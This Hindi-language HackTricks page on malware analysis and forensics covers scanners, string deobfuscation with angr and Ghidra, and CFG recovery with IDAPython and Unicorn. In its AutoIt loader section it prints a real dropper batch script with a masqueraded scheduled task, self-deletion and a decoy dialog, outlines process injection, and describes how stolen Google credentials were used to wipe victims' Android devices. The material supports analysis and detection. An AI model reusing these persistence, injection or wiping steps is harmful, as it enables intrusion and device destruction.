# मैलवेयर विश्लेषण

{{#include ../../banners/hacktricks-training.md}}

## फॉरेंसिक्स चीटशीट्स

[https://www.jaiminton.com/cheatsheet/DFIR/#](https://www.jaiminton.com/cheatsheet/DFIR/)

## ऑनलाइन सेवाएँ

- [VirusTotal](https://www.virustotal.com/gui/home/upload)
- [HybridAnalysis](https://www.hybrid-analysis.com)
- [Koodous](https://koodous.com)
- [Intezer](https://analyze.intezer.com)
- [Any.Run](https://any.run/)

## ऑफ़लाइन एंटीवायरस और डिटेक्शन टूल्स

### Yara

#### इंस्टॉल
```bash
sudo apt-get install -y yara
```
#### नियम तैयार करें

इस स्क्रिप्ट का उपयोग github से सभी yara malware rules डाउनलोड और मर्ज करने के लिए करें: [https://gist.github.com/andreafortuna/29c6ea48adf3d45a979a78763cdc7ce9](https://gist.github.com/andreafortuna/29c6ea48adf3d45a979a78763cdc7ce9)\
_**rules**_ डायरेक्टरी बनाएँ और इसे चलाएँ। यह _**malware_rules.yar**_ नाम की एक फ़ाइल बनाएगा जिसमें सभी yara rules for malware शामिल होंगे।
```bash
wget https://gist.githubusercontent.com/andreafortuna/29c6ea48adf3d45a979a78763cdc7ce9/raw/4ec711d37f1b428b63bed1f786b26a0654aa2f31/malware_yara_rules.py
mkdir rules
python malware_yara_rules.py
```
#### स्कैन
```bash
yara -w malware_rules.yar image  #Scan 1 file
yara -w malware_rules.yar folder #Scan the whole folder
```
#### YaraGen: malware की जाँच और नियम बनाएँ

आप [**YaraGen**](https://github.com/Neo23x0/yarGen) टूल का उपयोग बाइनरी से yara rules बनाने के लिए कर सकते हैं। इन ट्यूटोरियल्स को देखें: [**Part 1**](https://www.nextron-systems.com/2015/02/16/write-simple-sound-yara-rules/), [**Part 2**](https://www.nextron-systems.com/2015/10/17/how-to-write-simple-but-sound-yara-rules-part-2/), [**Part 3**](https://www.nextron-systems.com/2016/04/15/how-to-write-simple-but-sound-yara-rules-part-3/)
```bash
python3 yarGen.py --update
python3.exe yarGen.py --excludegood -m  ../../mals/
```
### ClamAV

#### इंस्टॉल
```
sudo apt-get install -y clamav
```
#### Scan
```bash
sudo freshclam      #Update rules
clamscan filepath   #Scan 1 file
clamscan folderpath #Scan the whole folder
```
### [Capa](https://github.com/mandiant/capa)

**Capa** संभावित रूप से हानिकारक **capabilities** को executables: PE, ELF, .NET में पहचानता है। इसलिए यह Att\&ck tactics जैसी चीज़ें, या निम्नलिखित suspicious capabilities पाएगा:

- check for OutputDebugString error
- run as a service
- create process

इसे [**Github repo**](https://github.com/mandiant/capa) से प्राप्त करें।

### IOCs

IOC का मतलब Indicator Of Compromise है। एक IOC उन **conditions that identify** की एक सेट होती है जो कुछ संभावित अनचाहे सॉफ़्टवेयर या पुष्टि किए गए **malware** की पहचान करती है। Blue Teams इस तरह की परिभाषा का उपयोग अपने **systems** और **networks** में ऐसे **malicious files** को खोजने के लिए करते हैं।\
इन परिभाषाओं को साझा करना बहुत उपयोगी है क्योंकि जब किसी कंप्यूटर में malware की पहचान होती है और उसके लिए एक IOC बनाया जाता है, तो अन्य Blue Teams उस malware की तेज़ पहचान के लिए इसका उपयोग कर सकती हैं।

IOCs बनाने या संशोधित करने के लिए एक टूल है [**IOC Editor**](https://www.fireeye.com/services/freeware/ioc-editor.html)**.**\
आप [**Redline**](https://www.fireeye.com/services/freeware/redline.html) जैसे tools का उपयोग **डिवाइस में परिभाषित IOCs की खोज करने के लिए** कर सकते हैं।

### Loki

[**Loki**](https://github.com/Neo23x0/Loki) Simple Indicators of Compromise के लिए एक scanner है।\
पता लगाने के चार detection methods हैं:
```
1. File Name IOC
Regex match on full file path/name

2. Yara Rule Check
Yara signature matches on file data and process memory

3. Hash Check
Compares known malicious hashes (MD5, SHA1, SHA256) with scanned files

4. C2 Back Connect Check
Compares process connection endpoints with C2 IOCs (new since version v.10)
```
### Linux Malware Detect

[**Linux Malware Detect (LMD)**](https://www.rfxn.com/projects/linux-malware-detect/) एक Linux के लिए malware scanner है जो GNU GPLv2 license के तहत रिलीज़ किया गया है, और यह shared hosted environments में आने वाले खतरों को ध्यान में रखकर डिज़ाइन किया गया है। यह network edge intrusion detection systems से मिलने वाले threat data का उपयोग करके उन malware को निकालता है जो सक्रिय रूप से हमलों में उपयोग किए जा रहे हैं और detection के लिए signatures जनरेट करता है। इसके अतिरिक्त, threat data LMD checkout फीचर के माध्यम से user submissions और malware community resources से भी प्राप्त होता है।

### rkhunter

Tools like [**rkhunter**](http://rkhunter.sourceforge.net) का उपयोग फ़ाइल सिस्टम की जांच करने के लिए किया जा सकता है ताकि संभावित **rootkits** और malware का पता लगाया जा सके।
```bash
sudo ./rkhunter --check -r / -l /tmp/rkhunter.log [--report-warnings-only] [--skip-keypress]
```
### FLOSS

[**FLOSS**](https://github.com/mandiant/flare-floss) एक टूल है जो विभिन्न तकनीकों का उपयोग करके executables के अंदर obfuscated strings को खोजने की कोशिश करेगा।

### PEpper

[PEpper ](https://github.com/Th3Hurrican3/PEpper) कुछ बेसिक चीज़ें executable के अंदर चेक करता है (binary data, entropy, URLs and IPs, some yara rules)।

### PEstudio

[PEstudio](https://www.winitor.com/download) एक टूल है जो Windows executables की जानकारी प्राप्त करने की अनुमति देता है जैसे imports, exports, headers, और साथ ही यह virus total को चेक करेगा और संभावित Att\&ck techniques को खोजेगा।

### Detect It Easy(DiE)

[**DiE**](https://github.com/horsicq/Detect-It-Easy/) एक टूल है जो पता लगाने के लिए कि कोई फाइल **encrypted** है और साथ ही **packers** को भी ढूँढता है।

### NeoPI

[**NeoPI** ](https://github.com/CiscoCXSecurity/NeoPI) एक Python script है जो text/script files के भीतर **obfuscated** और **encrypted** content का पता लगाने के लिए विभिन्न **statistical methods** का उपयोग करता है। NeoPI का उद्देश्य **detection of hidden web shell code** में सहायता करना है।

### **php-malware-finder**

[**PHP-malware-finder**](https://github.com/nbs-system/php-malware-finder) अपनी पूरी कोशिश करता है **obfuscated**/**dodgy code** का पता लगाने के लिए, साथ ही उन फाइलों का भी जो अक्सर **PHP** functions का उपयोग करती हैं जो **malwares**/webshells में प्रयुक्त होते हैं।

### Apple Binary Signatures

कुछ **malware sample** की जांच करते समय, आपको हमेशा बाइनरी का **check the signature** करना चाहिए, क्योंकि जिसने इसे साइन किया वह **developer** पहले से ही **related** हो सकता है **malware** के साथ।
```bash
#Get signer
codesign -vv -d /bin/ls 2>&1 | grep -E "Authority|TeamIdentifier"

#Check if the app’s contents have been modified
codesign --verify --verbose /Applications/Safari.app

#Check if the signature is valid
spctl --assess --verbose /Applications/Safari.app
```
## Detection Techniques

### File Stacking

यदि आप जानते हैं कि किसी फ़ोल्डर में web server की **files** थी और उसे **last updated on some date** किया गया था, तो web server की सभी फ़ाइलों के बनाए जाने और संशोधित होने की **date** **Check** करें — और यदि कोई तारीख़ **suspicious** लगे तो उस फ़ाइल की जाँच करें।

### Baselines

यदि किसी फ़ोल्डर की फ़ाइलें **shouldn't have been modified** होनी चाहिए, तो आप उस फ़ोल्डर की **original files** का **hash** निकालकर उन्हें **current** फ़ाइलों से **compare** कर सकते हैं। जो कुछ भी modified होगा वह **suspicious** होगा।

### Statistical Analysis

जब जानकारी logs में saved होती है, आप ऐसी statistics देख सकते हैं जैसे कि web server की हर फ़ाइल को कितनी बार access किया गया — क्योंकि एक web shell संभवतः सबसे अधिक access की गई फ़ाइलों में से एक हो सकता है।

---

### Android in-app native telemetry (no root)

Android पर, आप target app process के अंदर native code को instrument कर सकते हैं एक छोटी logger library को अन्य JNI libs के initialize होने से पहले preload करके। इससे system-wide hooks या root के बिना native व्यवहार की जल्दी visibility मिलती है। एक लोकप्रिय तरीका SoTap है: सही ABI के लिए libsotap.so को APK में डालें और जल्दी एक System.loadLibrary("sotap") कॉल inject करें (उदा., static initializer या Application.onCreate), फिर internal/external paths से या Logcat fallback के जरिए logs collect करें।

सेटअप विवरण और log paths के लिए Android native reversing पेज देखें:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/reversing-native-libraries.md
{{#endref}}

---

### Android/JNI native string deobfuscation with angr + Ghidra

कुछ Android malware और RASP-protected apps JNI method names और signatures को RegisterNatives कॉल करने से पहले runtime पर decode करके छिपाते हैं। जब anti-debug के कारण Frida/ptrace instrumentation रुक जाता है, तब भी आप plaintext को offline recover कर सकते हैं — बाइनरी के अंदर के decoder को angr से execute करके और फिर परिणामों को Ghidra में comments के रूप में push करके।

मुख्य विचार: .so के अंदर के decoder को एक callable function की तरह मानें, इसे .rodata में obfuscated byte blobs पर execute करें, और पहले \x00 (C-string terminator) तक के output bytes को concretize करें। address mismatches से बचने के लिए angr और Ghidra दोनों का same image base रखें।

Workflow overview
- Ghidra में triage: JNI_OnLoad और RegisterNatives सेटअप में decoder और उसके calling convention/arguments की पहचान करें।
- angr (CPython3) चलाएँ ताकि प्रत्येक target string के लिए decoder execute कर सकें और results dump कर सकें।
- Ghidra में annotate करें: तेज JNI reconstruction के लिए प्रत्येक call site पर decoded strings को auto-comment करें।

Ghidra triage (JNI_OnLoad pattern)
- JNI datatypes को JNI_OnLoad पर लागू करें ताकि Ghidra JNINativeMethod structures को पहचान सके।
- Oracle docs के अनुसार Typical JNINativeMethod:

```c
typedef struct {
char *name;      // e.g., "nativeFoo"
char *signature; // e.g., "()V", "()[B"
void *fnPtr;     // native implementation address
} JNINativeMethod;
```
- RegisterNatives कॉल्स की तलाश करें। यदि library नाम/ signature को एक local routine (उदा., FUN_00100e10) के साथ बनाती है जो कि एक static byte table (उदा., DAT_00100bf4) को रिफरेंस करता है और (encoded_ptr, out_buf, length) जैसे parameters लेता है, तो यह offline execution के लिए एक आदर्श लक्ष्य है।

angr setup (execute the decoder offline)
- वही base इस्तेमाल करके .so लोड करें जो Ghidra में उपयोग हुआ था (उदा., 0x00100000) और external libs के auto-loading को disable करें ताकि state छोटा रहे।

<details>
<summary>angr setup and offline decoder execution</summary>
```python
import angr, json

project = angr.Project(
'/path/to/libtarget.so',
load_options={'main_opts': {'base_addr': 0x00100000}},
auto_load_libs=False,
)

ENCODING_FUNC_ADDR = 0x00100e10  # decoder function discovered in Ghidra

def decode_string(enc_addr, length):
# fresh blank state per evaluation
st = project.factory.blank_state()
outbuf = st.heap.allocate(length)
call = project.factory.callable(ENCODING_FUNC_ADDR, base_state=st)
ret_ptr = call(enc_addr, outbuf, length)  # returns outbuf pointer
rs = call.result_state
raw = rs.solver.eval(rs.memory.load(ret_ptr, length), cast_to=bytes)
return raw.split(b'\x00', 1)[0].decode('utf-8', errors='ignore')

# Example: decode a JNI signature at 0x100933 of length 5 → should be ()[B
print(decode_string(0x00100933, 5))
```
</details>

- बड़े पैमाने पर, call sites का एक static map बनाएं जो decoder के arguments (encoded_ptr, size) से मेल खाता हो। Wrappers arguments छिपा सकते हैं, इसलिए यदि API recovery noisy हो तो आप यह mapping Ghidra xrefs से manually बना सकते हैं।

<details>
<summary>angr के साथ कई call sites को बैच में decode करें</summary>
```python
# call_site -> (encoded_addr, size)
call_site_args_map = {
0x00100f8c: (0x00100b81, 0x41),
0x00100fa8: (0x00100bca, 0x04),
0x00100fcc: (0x001007a0, 0x41),
0x00100fe8: (0x00100933, 0x05),
0x0010100c: (0x00100c62, 0x41),
0x00101028: (0x00100c15, 0x16),
0x00101050: (0x00100a49, 0x101),
0x00100cf4: (0x00100821, 0x11),
0x00101170: (0x00100940, 0x101),
0x001011cc: (0x0010084e, 0x13),
0x00101334: (0x001007e9, 0x0f),
0x00101478: (0x0010087d, 0x15),
0x001014f8: (0x00100800, 0x19),
0x001015e8: (0x001008e6, 0x27),
0x0010160c: (0x00100c33, 0x13),
}

decoded_map = { hex(cs): decode_string(enc, sz)
for cs, (enc, sz) in call_site_args_map.items() }

import json
print(json.dumps(decoded_map, indent=2))
with open('decoded_strings.json', 'w') as f:
json.dump(decoded_map, f, indent=2)
```
</details>

Ghidra में call sites को एनोटेट करें
Option A: Jython-only comment writer (use a pre-computed JSON)
- चूंकि angr को CPython3 की आवश्यकता है, deobfuscation और annotation को अलग रखें। पहले ऊपर दिया गया angr script चलाएँ ताकि decoded_strings.json बन जाए। फिर इस Jython GhidraScript को चलाएँ ताकि प्रत्येक call site पर PRE_COMMENTs लिखे जाएँ (और संदर्भ के लिए caller function name शामिल करें):

<details>
<summary>Ghidra Jython script to annotate decoded JNI strings</summary>
```python
#@category Android/Deobfuscation
# Jython in Ghidra 10/11
import json
from ghidra.program.model.listing import CodeUnit

# Ask for the JSON produced by the angr script
f = askFile('Select decoded_strings.json', 'Load')
mapping = json.load(open(f.absolutePath, 'r'))  # keys as hex strings

fm = currentProgram.getFunctionManager()
rm = currentProgram.getReferenceManager()

# Replace with your decoder address to locate call-xrefs (optional)
ENCODING_FUNC_ADDR = 0x00100e10
enc_addr = toAddr(ENCODING_FUNC_ADDR)

callsite_to_fn = {}
for ref in rm.getReferencesTo(enc_addr):
if ref.getReferenceType().isCall():
from_addr = ref.getFromAddress()
fn = fm.getFunctionContaining(from_addr)
if fn:
callsite_to_fn[from_addr.getOffset()] = fn.getName()

# Write comments from JSON
for k_hex, s in mapping.items():
cs = int(k_hex, 16)
site = toAddr(cs)
caller = callsite_to_fn.get(cs, None)
text = s if caller is None else '%s @ %s' % (s, caller)
currentProgram.getListing().setComment(site, CodeUnit.PRE_COMMENT, text)
print('[+] Annotated %d call sites' % len(mapping))
```
</details>

Option B: एकल CPython स्क्रिप्ट via pyhidra/ghidra_bridge
- वैकल्पिक रूप से, pyhidra या ghidra_bridge का उपयोग करके उसी CPython process से Ghidra’s API चलाएँ जो angr चला रहा हो। इससे आप decode_string() को कॉल करके और बिना किसी मध्यवर्ती फ़ाइल के तुरंत PRE_COMMENTs सेट कर सकते हैं। लॉजिक Jython स्क्रिप्ट की तरह ही है: ReferenceManager के जरिए callsite→function मैप बनाएं, angr से decode करें, और टिप्पणियाँ सेट करें।

Why this works and when to use it
- ऑफ़लाइन निष्पादन RASP/anti-debug को बायपास करता है: स्ट्रिंग्स रिकवर करने के लिए कोई ptrace या Frida hooks आवश्यक नहीं होते।
- Ghidra और angr के base_addr को समकक्ष रखना (उदा., 0x00100000) सुनिश्चित करता है कि function/data पते दोनों टूल्स में मेल खाते हैं।
- decoders के लिए पुनरावृत्तयोग्य तरीका: transform को एक pure function की तरह मानें, एक output buffer एक fresh state में allocate करें, इसे (encoded_ptr, out_ptr, len) के साथ कॉल करें, फिर state.solver.eval के जरिए concretize करें और C-strings को \x00 तक parse करें।

Notes and pitfalls
- लक्षित ABI/calling convention का सम्मान करें। angr.factory.callable आर्क के आधार पर एक चुनता है; यदि arguments शिफ्ट दिखते हैं, तो cc को स्पष्ट रूप से specify करें।
- यदि decoder zeroed output buffers की अपेक्षा करता है, तो कॉल से पहले state में outbuf को zeros से initialize करें।
- position-independent Android .so के लिए, हमेशा base_addr प्रदान करें ताकि angr में पते Ghidra में दिखने वाले पतों से मेल खाएँ।
- भले ही ऐप decoder को thin stubs के पीछे wrap करे, call-xrefs enumerate करने के लिए currentProgram.getReferenceManager() का प्रयोग करें।

For angr basics, see: [angr basics](../../reversing/reversing-tools-basic-methods/angr/README.md)

---

## डायनामिक कंट्रोल-फ़्लो को डि-ऑबफ़स्केट करना (JMP/CALL RAX Dispatchers)

आधुनिक malware परिवार कंट्रोल-फ़्लो ग्राफ (CFG) obfuscation का भारी दुरुपयोग करते हैं: सीधे jump/call के बजाय वे destination को रन-टाइम पर compute करते हैं और `jmp rax` या `call rax` execute करते हैं। एक छोटा *dispatcher* (आम तौर पर नौ निर्देश) CPU के `ZF`/`CF` flags के आधार पर final target सेट करता है, जिससे static CFG recovery पूरी तरह टूट जाती है।

यह तकनीक — जिसे SLOW#TEMPEST loader ने प्रदर्शित किया — को एक तीन-स्टेप workflow से मात दी जा सकती है जो केवल IDAPython और Unicorn CPU emulator पर निर्भर करती है।

### 1. हर indirect jump / call ढूँढें
```python
import idautils, idc

for ea in idautils.FunctionItems(idc.here()):
mnem = idc.print_insn_mnem(ea)
if mnem in ("jmp", "call") and idc.print_operand(ea, 0) == "rax":
print(f"[+] Dispatcher found @ {ea:X}")
```
### 2. डिस्पैचर बाइट-कोड निकालें
```python
import idc

def get_dispatcher_start(jmp_ea, count=9):
s = jmp_ea
for _ in range(count):
s = idc.prev_head(s, 0)
return s

start = get_dispatcher_start(jmp_ea)
size  = jmp_ea + idc.get_item_size(jmp_ea) - start
code  = idc.get_bytes(start, size)
open(f"{start:X}.bin", "wb").write(code)
```
### 3. Unicorn के साथ इसे दो बार Emulate करें
```python
from unicorn import *
from unicorn.x86_const import *
import struct

def run(code, zf=0, cf=0):
BASE = 0x1000
mu = Uc(UC_ARCH_X86, UC_MODE_64)
mu.mem_map(BASE, 0x1000)
mu.mem_write(BASE, code)
mu.reg_write(UC_X86_REG_RFLAGS, (zf << 6) | cf)
mu.reg_write(UC_X86_REG_RAX, 0)
mu.emu_start(BASE, BASE+len(code))
return mu.reg_read(UC_X86_REG_RAX)
```
`run(code,0,0)` और `run(code,1,1)` चलाएँ ताकि *false* और *true* ब्रांच लक्ष्य प्राप्त हो सकें।

### 4. Patch back a direct jump / call
```python
import struct, ida_bytes

def patch_direct(ea, target, is_call=False):
op   = 0xE8 if is_call else 0xE9           # CALL rel32 or JMP rel32
disp = target - (ea + 5) & 0xFFFFFFFF
ida_bytes.patch_bytes(ea, bytes([op]) + struct.pack('<I', disp))
```
पैच करने के बाद, पूरा CFG और Hex-Rays आउटपुट बहाल करने के लिए फ़ंक्शन पर IDA को पुनः विश्लेषण करने के लिए मजबूर करें:
```python
import ida_auto, idaapi
idaapi.reanalyze_function(idc.get_func_attr(ea, idc.FUNCATTR_START))
```
### 5. अप्रत्यक्ष API कॉल लेबल करें

एक बार जब हर `call rax` का वास्तविक गंतव्य ज्ञात हो जाए, तो आप IDA को बता सकते हैं कि यह क्या है ताकि पैरामीटर प्रकार & वेरिएबल नाम स्वतः पुनः प्राप्त हो जाएँ:
```python
idc.set_callee_name(call_ea, resolved_addr, 0)  # IDA 8.3+
```
### व्यावहारिक लाभ

* वास्तविक CFG को पुनर्स्थापित करता है → decompilation *10* लाइनों से हजारों लाइनों तक हो जाता है।
* string-cross-reference & xrefs सक्षम करता है, जिससे behaviour reconstruction सहज हो जाता है।
* Scripts पुन: उपयोग किए जा सकते हैं: इन्हें उसी ट्रिक से संरक्षित किसी भी loader में डाल दें।

---

## AutoIt-based loaders: .a3x decryption, Task Scheduler masquerade and RAT injection

यह intrusion pattern एक signed MSI, AutoIt loaders जो .a3x में compiled हैं, और एक Task Scheduler job को जोड़ता है जो एक benign app के रूप में छद्म रूप धारण करता है।

### MSI → custom actions → AutoIt orchestrator

MSI custom actions द्वारा निष्पादित Process tree और commands:

- MsiExec.exe → cmd.exe install.bat को चलाने के लिए
- WScript.exe एक decoy error dialog दिखाने के लिए
```cmd
%SystemRoot%\system32\cmd.exe /c %APPDATA%\스트레스 클리어\install.bat
%SystemRoot%\System32\WScript.exe %APPDATA%\스트레스 클리어\error.vbs
```
install.bat (loader को ड्रॉप करता है, persistence सेट करता है, self-cleans करता है):
```bat
@echo off
set dr=Music

copy "%~dp0AutoIt3.exe" %public%\%dr%\AutoIt3.exe
copy "%~dp0IoKlTr.au3" %public%\%dr%\IoKlTr.au3

cd /d %public%\%dr% & copy c:\windows\system32\schtasks.exe hwpviewer.exe ^
& hwpviewer /delete /tn "IoKlTr" /f ^
& hwpviewer /create /sc minute /mo 1 /tn "IoKlTr" /tr "%public%\%dr%\AutoIt3.exe %public%\%dr%\IoKlTr.au3"

del /f /q "%~dp0AutoIt3.exe"
del /f /q "%~dp0IoKlTr.au3"
del /f /q "%~f0"
```
error.vbs (उपयोगकर्ता भ्रामक फ़ाइल):
```vb
MsgBox "현재 시스템 언어팩과 프로그램 언어팩이 호환되지 않아 실행할 수 없습니다." & vbCrLf & _
"설정에서 한국어(대한민국) 언어팩을 설치하거나 변경한 뒤 다시 실행해 주세요.", _
vbCritical, "언어팩 오류"
```
Key artifacts and masquerade:
- AutoIt3.exe और IoKlTr.au3 को C:\Users\Public\Music में ड्रॉप करता है
- schtasks.exe की कॉपी को hwpviewer.exe में रखता है (Hangul Word Processor viewer के रूप में masquerade)
- एक scheduled task "IoKlTr" बनाता है जो हर 1 मिनट पर चलता है
- Startup LNK दिखता है जैसे Smart_Web.lnk; mutex: `Global\AB732E15-D8DD-87A1-7464-CE6698819E701`
- %APPDATA%\Google\Browser\ के तहत उन सबफ़ोल्डरों में मॉड्यूल स्टेज करता है जिनमें `adb` या `adv` होते हैं और उन मॉड्यूल्स को autoit.vbs/install.bat helpers के जरिए शुरू करता है

Forensic triage tips:
- schtasks enumeration: `schtasks /query /fo LIST /v | findstr /i "IoKlTr hwpviewer"`
- Task XML के साथ co-located schtasks.exe की renamed copies खोजें: `dir /a "C:\Users\Public\Music\hwpviewer.exe"`
- सामान्य पाथ्स: `C:\Users\Public\Music\AutoIt3.exe`, `...\IoKlTr.au3`, Startup `Smart_Web.lnk`, `%APPDATA%\Google\Browser\(adb|adv)*`
- प्रोसेस निर्माण को correlate करें: AutoIt3.exe द्वारा legitimate Windows binaries को spawn करना (उदा., cleanmgr.exe, hncfinder.exe)

### AutoIt loaders and .a3x payload decryption → injection

- AutoIt modules को `#AutoIt3Wrapper_Outfile_type=a3x` के साथ compile किया जाता है और benign processes में inject करने से पहले embedded payloads को decrypt करते हैं।
- Observed families: QuasarRAT (hncfinder.exe में inject), RftRAT/RFTServer (cleanmgr.exe में inject), और RemcosRAT मॉड्यूल्स (`Remcos\RunBinary.a3x`)।
- Decryption pattern: HMAC के जरिए एक AES key निकाली जाती है, embedded blob को decrypt किया जाता है, फिर plaintext module को inject किया जाता है।

Generic decryption skeleton (exact HMAC input/algorithm is family-specific):
```python
import hmac, hashlib
from Crypto.Cipher import AES

def derive_aes_key(secret: bytes, data: bytes) -> bytes:
# Example: HMAC-SHA256 → first 16/32 bytes as AES key
return hmac.new(secret, data, hashlib.sha256).digest()

def aes_decrypt_cbc(key: bytes, iv: bytes, ct: bytes) -> bytes:
return AES.new(key, AES.MODE_CBC, iv=iv).decrypt(ct)
```
Common injection flow (CreateRemoteThread-style):
- लक्ष्य होस्ट का CreateProcess (suspended) (उदा., cleanmgr.exe)
- VirtualAllocEx + WriteProcessMemory के साथ डिक्रिप्टेड module/shellcode लिखना
- payload को execute करने के लिए CreateRemoteThread या QueueUserAPC

Hunting ideas
- AutoIt3.exe जो MsiExec.exe या WScript.exe द्वारा parent किया गया हो और system utilities spawn कर रहा हो
- पब्लिक/यूजर-राइटेबल पथों में `.a3x` एक्सटेंशन वाली फाइलें या AutoIt script runners
- संदिग्ध scheduled tasks जो AutoIt3.exe या Microsoft द्वारा साइन न किए गए binaries चला रहे हों, और मिनट-स्तर के ट्रिगर्स हों

### Android Find My Device (Find Hub) का अकाउंट-टेकओवर दुरुपयोग

Windows intrusion के दौरान, operators ने चोरी किए गए Google क्रेडेंशियल्स का उपयोग करके पीड़ित के Android डिवाइसों को बार-बार wipe किया, notifications को suppress किया जबकि वे पीड़ित के logged-in desktop messenger के माध्यम से एक्सेस बढ़ा रहे थे।

ऑपरेटर के कदम (लॉग-इन ब्राउज़र सेशन से):
- Google Account → Security → Your devices की समीक्षा करें; Find My Phone → Find Hub खोलें (https://www.google.com/android/find)
- डिवाइस चुनें → Google पासवर्ड पुनः दर्ज करें → "Erase device" (factory reset) चलाएं; recovery को delay करने के लिए दोहराएं
- वैकल्पिक: लिंक्ड मेलबॉक्स (उदा., Naver) में अलर्ट ईमेल्स को साफ़ करें ताकि security notifications छिप जाएँ

## AdaptixC2: कॉन्फ़िगरेशन एक्सट्रैक्शन और TTPs

See the dedicated page:

{{#ref}}
adaptixc2-config-extraction-and-ttps.md
{{#endref}}

## संदर्भ

- [Unit42 – Evolving Tactics of SLOW#TEMPEST: A Deep Dive Into Advanced Malware Techniques](https://unit42.paloaltonetworks.com/slow-tempest-malware-obfuscation/)
- SoTap: Lightweight in-app JNI (.so) behavior logger – [github.com/RezaArbabBot/SoTap](https://github.com/RezaArbabBot/SoTap)
- Strategies for Analyzing Native Code in Android Applications: Combining Ghidra and Symbolic Execution for Code Decryption and Deobfuscation – [revflash.medium.com](https://revflash.medium.com/strategies-for-analyzing-native-code-in-android-applications-combining-ghidra-and-symbolic-aaef4c9555df)
- Ghidra – [github.com/NationalSecurityAgency/ghidra](https://github.com/NationalSecurityAgency/ghidra)
- angr – [angr.io](https://angr.io/)
- JNI_OnLoad and invocation API – [docs.oracle.com](https://docs.oracle.com/javase/8/docs/technotes/guides/jni/spec/invocation.html#JNJI_OnLoad)
- RegisterNatives – [docs.oracle.com](https://docs.oracle.com/javase/8/docs/technotes/guides/jni/spec/functions.html#RegisterNatives)
- Tracing JNI Functions – [valsamaras.medium.com](https://valsamaras.medium.com/tracing-jni-functions-75b04bee7c58)
- Native Enrich: Scripting Ghidra and Frida to discover hidden JNI functions – [laripping.com](https://laripping.com/blog-posts/2021/12/20/nativeenrich.html)
- [Unit42 – AdaptixC2: A New Open-Source Framework Leveraged in Real-World Attacks](https://unit42.paloaltonetworks.com/adaptixc2-post-exploitation-framework/)
- KONNI-linked APT abuses Google Find Hub to wipe Android devices after Windows intrusion – [genians.co.kr](https://www.genians.co.kr/en/blog/threat_intelligence/android)
- Android Find My Device (Find Hub) – [google.com/android/find](https://www.google.com/android/find)
- RftRAT/RFTServer technical analysis – [asec.ahnlab.com](https://asec.ahnlab.com/en/59590/)
- HMAC background – [wikipedia.org/wiki/HMAC](https://en.wikipedia.org/wiki/HMAC)

{{#include ../../banners/hacktricks-training.md}}
